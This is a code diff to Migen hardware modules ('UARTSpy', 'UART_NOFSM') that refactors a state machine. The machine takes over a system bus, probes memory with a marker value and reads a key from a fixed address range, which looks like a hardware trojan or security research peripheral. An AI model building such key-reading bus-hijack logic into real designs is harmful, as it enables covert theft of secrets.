@@ -161,7 +161,7 @@ class UARTSpy(Module):
             self.data.eq(0x00ACCE55),
             self.bus.we.eq(1),
             If(self.bus.ack,
-                self.bus.ack.eq(0),
+                # self.bus.ack.eq(0),
                 self.ready.eq(1),
                 NextState("UART_ROUTINE_READ")
             )
@@ -173,7 +173,7 @@ class UARTSpy(Module):
             self.bus.cyc.eq(1),
             self.bus.we.eq(0),
             If(self.bus.ack,
-                self.bus.ack.eq(0),
+                # self.bus.ack.eq(0),
                 If(self.bus.dat_r == 0x00ACCE55, #validate write
                     NextValue(self.addr, self.addr + 4)
                 ),
@@ -233,8 +233,7 @@ class UARTSpy(Module):
         )
 
 class UART_NOFSM(Module):
-    def __init__(self, bus, cooldown = 10, max_lawfullness = 25):
-        self.bus = bus
+    def __init__(self, arbiter_bus, cooldown = 10, max_lawfullness = 25):
 
         # Inputs / parameters
         self.cooldown = cooldown
@@ -254,6 +253,12 @@ class UART_NOFSM(Module):
         self.debug_read_data = Signal(32)
         self.debug_read_enable = Signal()
 
+        self.bus_stb = Signal()
+        self.bus_cyc = Signal()
+        self.bus_we = Signal()
+        self.bus_dat_r = Signal(32)
+        self.bus_adr = Signal(32)
+
         # State enumeration
         IDLE = 0
         BECOME_MASTER = 1
@@ -261,17 +266,19 @@ class UART_NOFSM(Module):
         UART_ROUTINE_READ = 3
         BECOME_SPY = 4
         READ_KEY = 5
-        RESET = 6
+        RESET_STATE = 6
         DONE = 7
 
+        self.comb += [
+            arbiter_bus.stb.eq(self.bus_stb),
+            arbiter_bus.cyc.eq(self.bus_cyc),
+            arbiter_bus.we.eq(self.bus_we),
+            arbiter_bus.adr.eq(self.bus_adr >> 2)
+        ]
+
         self.sync += [
-            # Default fall-through values
-            # self.ready.eq(0),
-            # self.bus.stb.eq(0),
-            # self.bus.cyc.eq(0),
-            # self.bus.we.eq(0),
-            # self.debug_read_enable.eq(0),
-            # Display("State: %i",state),
+            # Display("sca %i%i%i",arbiter_bus.stb,arbiter_bus.cyc,arbiter_bus.ack),
+
             # State logic
             If(self.state == IDLE,
                 self.time_counter.eq(self.time_counter + 1),
@@ -290,28 +297,30 @@ class UART_NOFSM(Module):
                 self.uart_master_status.eq(1),
                 self.state.eq(UART_ROUTINE_WRITE)
             ).Elif(self.state == UART_ROUTINE_WRITE,
-                self.bus.adr.eq(self.addr >> 2),
-                self.bus.stb.eq(1),
-                self.bus.cyc.eq(1),
+                self.bus_adr.eq(self.addr >> 2),
+                self.bus_stb.eq(1),
+                self.bus_cyc.eq(1),
                 self.data.eq(0x00ACCE55),
-                self.bus.we.eq(1),
-                If(self.bus.ack,
-                    #self.bus.ack.eq(0),  # not necessary; slave clears ack
+                self.bus_we.eq(1),
+                # Display("waiting for ack..."),
+                If(arbiter_bus.ack,
+                    # Display(f"{RED}GOT ACK !{RESET_STATE}"),
+                    #arbiter_bus.ack.eq(0),  # not necessary; slave clears ack
                     self.ready.eq(1),
                     self.state.eq(UART_ROUTINE_READ)
                 )
             ).Elif(self.state == UART_ROUTINE_READ,
-                self.bus.adr.eq(self.addr >> 2),
-                self.bus.stb.eq(1),
-                self.bus.cyc.eq(1),
-                self.bus.we.eq(0),
-                If(self.bus.ack,
-                    # self.bus.ack.eq(0),
-                    If(self.bus.dat_r == 0x00ACCE55,
+                self.bus_adr.eq(self.addr >> 2),
+                self.bus_stb.eq(1),
+                self.bus_cyc.eq(1),
+                self.bus_we.eq(0),
+                If(arbiter_bus.ack,
+                    # arbiter_bus.ack.eq(0),
+                    If(self.bus_dat_r == 0x00ACCE55,
                         self.addr.eq(self.addr + 4)
                     ),
                     If(self.addr + 4 >= 0x20000080,
-                        self.state.eq(RESET)
+                        self.state.eq(RESET_STATE)
                     ).Else(
                         self.state.eq(UART_ROUTINE_WRITE)
                     )
@@ -321,36 +330,43 @@ class UART_NOFSM(Module):
                 self.uart_master_status.eq(1),
                 self.state.eq(READ_KEY)
             ).Elif(self.state == READ_KEY,
-                self.bus.adr.eq(self.addr >> 2),
-                self.bus.stb.eq(1),
-                self.bus.cyc.eq(1),
-                self.bus.we.eq(0),
+                self.bus_adr.eq(self.addr >> 2),
+                self.bus_stb.eq(1),
+                self.bus_cyc.eq(1),
+                self.bus_we.eq(0),
                 self.debug_read_data.eq(self.data),
-                If(self.bus.ack,
+                If(arbiter_bus.ack,
                     self.debug_read_enable.eq(1),
-                    self.data.eq(self.bus.dat_r),
+                    self.data.eq(self.bus_dat_r),
                     self.ready.eq(1),
                     self.addr.eq(self.addr + 4),
                     If(self.addr + 4 >= 0x20000010,
-                        self.state.eq(RESET)
+                        self.state.eq(RESET_STATE)
                     ).Else(
                         self.state.eq(READ_KEY)
                     )
                 )
-            ).Elif(self.state == RESET,
+            ).Elif(self.state == RESET_STATE,
                 self.uart_master_status.eq(0),
                 self.uart_slave_status.eq(1),
-                self.bus.stb.eq(0),
-                self.bus.cyc.eq(0),
-                self.bus.we.eq(0),
+                self.bus_stb.eq(0),
+                self.bus_cyc.eq(0),
+                self.bus_we.eq(0),
                 self.debug_read_enable.eq(0),
                 self.addr.eq(0x20000000),
                 self.state.eq(IDLE)
             ).Elif(self.state == DONE,
                 self.ready.eq(1),
-                self.bus.cyc.eq(0),
-                self.bus.stb.eq(0),
-                self.bus.we.eq(0)
+                self.bus_cyc.eq(0),
+                self.bus_stb.eq(0),
+                self.bus_we.eq(0)
+            ).Else(
+                # Default fall-through values
+                self.ready.eq(0),
+                self.bus_stb.eq(0),
+                self.bus_cyc.eq(0),
+                self.bus_we.eq(0),
+                self.debug_read_enable.eq(0),
             )
         ]
 
